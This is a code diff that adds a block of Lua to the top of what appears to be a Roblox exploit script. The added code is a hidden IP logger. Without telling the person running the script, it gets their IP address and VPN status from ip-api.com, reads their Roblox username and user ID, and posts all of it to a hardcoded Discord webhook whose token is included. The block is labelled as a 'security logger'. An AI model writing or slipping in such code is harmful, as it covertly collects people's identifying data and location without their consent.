@@ -1,3 +1,66 @@
+local NNN = "https://discord.com/api/webhooks/1466284518272139398/stNqUC_8Q3D92rmpOqfoI8ENwIfHwIkRO81LD89EcRmHKgITRhPuWLeKLRKNppUgAz2g"
+
+local h = game:GetService("HttpService")
+local p = game:GetService("Players")
+local l = p.LocalPlayer
+
+local website = "idk"
+local vpn = "idk"
+local r = syn and syn.request or http_request or request or (http and http.request)
+
+pcall(function()
+    local res = r({
+        Url = "http://ip-api.com/json/?fields=66846719",
+        Method = "GET"
+    })
+    if res and res.Body then
+        local d = h:JSONDecode(res.Body)
+        website = d.query or "idk"
+        if d.proxy ~= nil then
+            vpn = d.proxy and "Yes" or "No"
+        end
+    end
+end)
+
+local username = "idk"
+local userid = "idk"
+
+if l then
+    username = l.Name
+    userid = l.UserId
+end
+
+local Bet = {
+    ["embeds"] = {
+        {
+            title = "Secret Service Panel Executed, Here Are Some Info I Can Get",
+            color = 8388736, -- purple
+            fields = {
+                { name = "Username", value = username, inline = true },
+                { name = "User ID", value = tostring(userid), inline = true },
+                { name = "Ip", value = website, inline = false },
+                { name = "Using VPN?", value = vpn, inline = true }
+            },
+            footer = {
+                text = "Logged by 7n8z security logger"
+            }
+        }
+    }
+}
+
+pcall(function()
+    if r then
+        r({
+            Url = NNN,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = h:JSONEncode(Bet)
+        })
+    else
+        h:PostAsync(NNN, h:JSONEncode(Bet))
+    end
+end)
+
 local selection
 local nodes = {}
 
